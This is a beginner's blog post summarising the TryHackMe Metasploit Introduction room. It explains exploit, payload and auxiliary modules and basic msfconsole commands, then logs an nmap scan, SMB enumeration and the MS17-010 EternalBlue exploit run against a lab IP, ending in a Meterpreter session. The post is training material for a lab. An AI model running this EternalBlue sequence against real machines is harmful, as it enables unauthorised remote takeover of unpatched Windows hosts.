---
title: "Metasploit👋"
date: 2025-01-01 10:00:00 +0100
categories: [Blog]
tags: [introduction, cybersecurity, journey]
---
Beginner's Guide: TryHackMe Metasploit Introduction Room (Essentials Only)
Hey! I'm a total beginner, just finished the Metasploit Introduction room on TryHackMe. Here's the super short version of what it's about and what you need to know.
What is Metasploit?

Open-source tool/framework for penetration testing.
Huge collection of ready-to-use exploits, payloads, and scanners.
Used in msfconsole (command line) on Kali Linux.

Main Goal of This Room
Teach you the basics and structure of Metasploit — no rushing into hacks. It builds good habits early.
Key Concepts (Must Know)

Modules = building blocks:
Exploit: Attacks a vulnerability (e.g., gets remote code execution — RCE).
Payload: What runs AFTER the exploit succeeds (e.g., reverse shell, Meterpreter).
Auxiliary: Scanners, brute-forcers, etc.

Exploit ≠ Payload (biggest beginner confusion)
Exploit = opens the door.
Payload = what you do inside (like getting a shell).

Reverse Shells
Common payload because they work through firewalls.
But goal is controlled access, not just "get shell and done".


Basic Commands You'll Use

msfconsole → start it
search <keyword> → find modules
use <module> → select one
show options → see what to set
set RHOSTS <target IP>
set LHOST <your IP>
set payload <choice>
exploit or run → launch

Important Mindset

Metasploit is a tool, not magic.
Real pentesting: Recon → Enum → Research → Exploit → Post-exploit.
Don't blindly run exploits — understand the vulnerability first.

Common Beginner Mistakes to Avoid

Thinking Metasploit = instant hack.
Skipping research.
Confusing RCE with getting a shell.

ROOM Metaslpoit TryHackMe:

┌──(kali㉿kali2025)-[~/Downloads] 
└─$ nmap -sV -Pn 10.81.161.15
Ton scan :
445/tcp  microsoft-ds  Windows 7 - 10
139/tcp  netbios-ssn
135/tcp  msrpc
Ports RPC dynamiques ouverts

👉 Il dit seulement :
✔ SMB est OUVERT
✔ OS Windows
✔ RPC actif


we try this cmd to know version of smb : 
auxiliary(scanner/smb/smb_version)
run
===> (we did not get anything )

second try:🔍 Scanner les partages SMB
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.82.164.142
run
third try:4️⃣ Tester si SMB accepte une session anonyme
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.82.164.142
run

fourth try :5️⃣ Tester MS17-010 (SANS exploiter)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.82.164.142
run
===> MS17-010 est VULNERABLE → exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.82.164.142
set LHOST tun0
run
🎉🎉🎉Meterpreter session opened




